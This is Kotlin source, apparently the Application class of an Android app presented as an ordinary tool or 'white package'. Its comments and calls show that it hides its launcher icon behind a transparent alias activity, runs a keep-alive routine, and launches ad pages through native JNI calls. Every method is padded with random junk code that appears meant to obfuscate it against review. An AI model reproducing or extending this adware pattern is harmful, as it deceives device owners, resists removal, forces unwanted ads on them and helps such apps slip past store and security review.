package whj.gpowg.zsm

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import whj.gpowg.zsm.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import whj.mqgt.qqqb.base.APPContext
import whj.mqgt.qqqb.base.BaseApplication
import whj.mqgt.qqqb.base.OverseaAppHost
import whj.mqgt.qqqb.base.OverseaAppInitializer
import whj.mqgt.qqqb.ad.runtime.AdLifecycleInstaller


class JNSK : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: JNSK? = null
    }

    override fun onCreate() {
        val arr_RnulHEzWkCbRLaQgVa = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_RaYzZeFJxg  = (arr_RnulHEzWkCbRLaQgVa  shl 31) xor (arr_RnulHEzWkCbRLaQgVa  shr 96)
         val j_tzEWrklIGo  = i_RaYzZeFJxg .inv() and 0xFFFF
         if (j_tzEWrklIGo  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_MrnpPPYsGpTaBiemQ")
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
           val ZmNEiTgvaSlTRBO : Any = if (kotlin.random.Random.nextBoolean()) 7 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val zuEKrlkyrwgKaQefPl  = (ZmNEiTgvaSlTRBO  as? String)?.reversed() ?: "HoEJyVwXiVxBoRWvvlg_-477000223"

        if (zuEKrlkyrwgKaQefPl  == "tgzeafIQrq") {
            java.lang.System.out.print(zuEKrlkyrwgKaQefPl )
        }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
           val GnHbSsuxgCYBvTHqaD : Any = if (kotlin.random.Random.nextBoolean()) 2 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val IpKrQKk  = (GnHbSsuxgCYBvTHqaD  as? String)?.reversed() ?: "hMBuvI_1507346323"

        if (IpKrQKk  == "AgJmcvEFHLHdEIx") {
            java.lang.System.out.print(IpKrQKk )
        }
        ZNWV.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_chifnp  = listOf("bhvbGZpMGaBof", "MFledBiPgE", "SmzFqnHRhTb").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_FGExTaHr  = arr_chifnp .filter { it.length > 68 }
         if (ad_FGExTaHr .isNotEmpty() && java.lang.System.currentTimeMillis() < 75) {
             ad_FGExTaHr .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val arr_XXKymtqujUtzcX = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_zCoEpydtHyFiPWLo  = (arr_XXKymtqujUtzcX  shl 46) xor (arr_XXKymtqujUtzcX  shr 25)
         val j_XrFDOaVKLXTOAsuY  = i_zCoEpydtHyFiPWLo .inv() and 0xFFFF
         if (j_XrFDOaVKLXTOAsuY  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_BjvASebSOekXy")
         }
        // 启动图标隐藏：禁用 PWUT 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, ZNVC::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    }


    override fun initKeepPower(app: Application) {
        val arr_doXaPNuEzpdRijThwR = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_gfXOZIrhl  = (arr_doXaPNuEzpdRijThwR  shl 29) xor (arr_doXaPNuEzpdRijThwR  shr 80)
         val j_XymApKWFTXX  = i_gfXOZIrhl .inv() and 0xFFFF
         if (j_XymApKWFTXX  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_gXtREmxaGsnA")
         }
        NativeJniUtils.virinit(insApp)
    }

}